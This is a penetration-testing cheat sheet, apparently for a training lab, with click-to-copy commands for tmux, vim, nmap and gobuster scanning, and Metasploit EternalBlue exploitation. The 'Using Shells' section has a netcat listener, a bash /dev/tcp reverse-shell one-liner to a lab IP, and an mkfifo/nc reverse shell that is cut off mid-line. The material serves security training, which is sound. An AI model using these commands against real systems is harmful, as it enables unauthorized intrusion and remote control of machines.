<script>
function copyCommand(command) {
    var dummy = document.createElement("textarea");
    document.body.appendChild(dummy);
    dummy.value = command;
    dummy.select();
    document.execCommand("copy");
    document.body.removeChild(dummy);
    alert("Copied command: " + command);
}
</script>

## Basic Tools

### General

- <a href="javascript:void(0);" onclick="copyCommand('sudo openvpn user.ovpn')">**sudo openvpn user.ovpn**</a>: Connect to VPN
- <a href="javascript:void(0);" onclick="copyCommand('ifconfig/ip a')">**ifconfig/ip a**</a>: Show our IP address
- <a href="javascript:void(0);" onclick="copyCommand('netstat -rn')">**netstat -rn**</a>: Show networks accessible via the VPN
- <a href="javascript:void(0);" onclick="copyCommand('ssh user@10.10.10.10')">**ssh user@10.10.10.10**</a>: SSH to a remote server
- <a href="javascript:void(0);" onclick="copyCommand('ftp 10.129.42.253')">**ftp 10.129.42.253**</a>: FTP to a remote server

### tmux

- <a href="javascript:void(0);" onclick="copyCommand('tmux')">**tmux**</a>: Start tmux
- <a href="javascript:void(0);" onclick="copyCommand('ctrl+b')">**ctrl+b**</a>: tmux: default prefix
- <a href="javascript:void(0);" onclick="copyCommand('prefix c')">**prefix c**</a>: tmux: new window
- <a href="javascript:void(0);" onclick="copyCommand('prefix 1')">**prefix 1**</a>: tmux: switch to window (1)
- <a href="javascript:void(0);" onclick="copyCommand('prefix shift+%')">**prefix shift+%**</a>: tmux: split pane vertically
- <a href="javascript:void(0);" onclick="copyCommand('prefix shift+\"')">**prefix shift+"**</a>: tmux: split pane horizontally

### Vim

- <a href="javascript:void(0);" onclick="copyCommand('vim file')">**vim file**</a>: vim: open file with vim
- <a href="javascript:void(0);" onclick="copyCommand('esc+i')">**esc+i**</a>: vim: enter insert mode
- <a href="javascript:void(0);" onclick="copyCommand('esc')">**esc**</a>: vim: back to normal mode
- <a href="javascript:void(0);" onclick="copyCommand('x')">**x**</a>: vim: Cut character
- <a href="javascript:void(0);" onclick="copyCommand('dw')">**dw**</a>: vim: Cut word
- <a href="javascript:void(0);" onclick="copyCommand('dd')">**dd**</a>: vim: Cut full line
- <a href="javascript:void(0);" onclick="copyCommand('yw')">**yw**</a>: vim: Copy word
- <a href="javascript:void(0);" onclick="copyCommand('yy')">**yy**</a>: vim: Copy full line
- <a href="javascript:void(0);" onclick="copyCommand('p')">**p**</a>: vim: Paste
- <a href="javascript:void(0);" onclick="copyCommand(':1')">**:1**</a>: vim: Go to line number 1.
- <a href="javascript:void(0);" onclick="copyCommand(':w')">**:w**</a>: vim: Write the file 'i.e. save'
- <a href="javascript:void(0);" onclick="copyCommand(':q')">**:q**</a>: vim: Quit
- <a href="javascript:void(0);" onclick="copyCommand(':q!')">**:q!**</a>: vim: Quit without saving
- <a href="javascript:void(0);" onclick="copyCommand(':wq')">**:wq**</a>: vim: Write and quit

### Pentesting

#### Service Scanning

- <a href="javascript:void(0);" onclick="copyCommand('nmap 10.129.42.253')">**nmap 10.129.42.253**</a>: Run nmap on an IP
- <a href="javascript:void(0);" onclick="copyCommand('nmap -sV -sC -p- 10.129.42.253')">**nmap -sV -sC -p- 10.129.42.253**</a>: Run an nmap script scan on an IP
- <a href="javascript:void(0);" onclick="copyCommand('locate scripts/citrix')">**locate scripts/citrix**</a>: List various available nmap scripts
- <a href="javascript:void(0);" onclick="copyCommand('nmap --script smb-os-discovery.nse -p445 10.10.10.40')">**nmap --script smb-os-discovery.nse -p445 10.10.10.40**</a>: Run an nmap script on an IP
- <a href="javascript:void(0);" onclick="copyCommand('netcat 10.10.10.10 22')">**netcat 10.10.10.10 22**</a>: Grab banner of an open port

#### Web Enumeration

- <a href="javascript:void(0);" onclick="copyCommand('gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt')">**gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt**</a>: Run a directory scan on a website
- <a href="javascript:void(0);" onclick="copyCommand('gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt')">**gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt**</a>: Run a sub-domain scan on a website
- <a href="javascript:void(0);" onclick="copyCommand('curl -IL https://www.inlanefreight.com')">**curl -IL https://www.inlanefreight.com**</a>: Grab website banner
- <a href="javascript:void(0);" onclick="copyCommand('whatweb 10.10.10.121')">**whatweb 10.10.10.121**</a>: List details about the webserver/certificates
- <a href="javascript:void(0);" onclick="copyCommand('curl 10.10.10.121/robots.txt')">**curl 10.10.10.121/robots.txt**</a>: List potential directories in robots.txt

#### Public Exploits

- <a href="javascript:void(0);" onclick="copyCommand('searchsploit openssh 7.2')">**searchsploit openssh 7.2**</a>: Search for public exploits for a web application
- <a href="javascript:void(0);" onclick="copyCommand('msfconsole')">**msfconsole**</a>: MSF: Start the Metasploit Framework
- <a href="javascript:void(0);" onclick="copyCommand('search exploit eternalblue')">**search exploit eternalblue**</a>: MSF: Search for public exploits in MSF
- <a href="javascript:void(0);" onclick="copyCommand('use exploit/windows/smb/ms17_010_psexec')">**use exploit/windows/smb/ms17_010_psexec**</a>: MSF: Start using an MSF module
- <a href="javascript:void(0);" onclick="copyCommand('show options')">**show options**</a>: MSF: Show required options for an MSF module
- <a href="javascript:void(0);" onclick="copyCommand('set RHOSTS 10.10.10.40')">**set RHOSTS 10.10.10.40**</a>: MSF: Set a value for an MSF module option
- <a href="javascript:void(0);" onclick="copyCommand('check')">**check**</a>: MSF: Test if the target server is vulnerable
- <a href="javascript:void(0);" onclick="copyCommand('exploit')">**exploit**</a>: MSF: Run the exploit on the target server if vulnerable

#### Using Shells

- <a href="javascript:void(0);" onclick="copyCommand('nc -lvnp 1234')">**nc -lvnp 1234**</a>: Start a nc listener on a local port
- <a href="javascript:void(0);" onclick="copyCommand('bash -c \'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1\'')">**bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'**</a>: Send a reverse shell from the remote server
- <a href="javascript:void(0);" onclick="copyCommand('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 
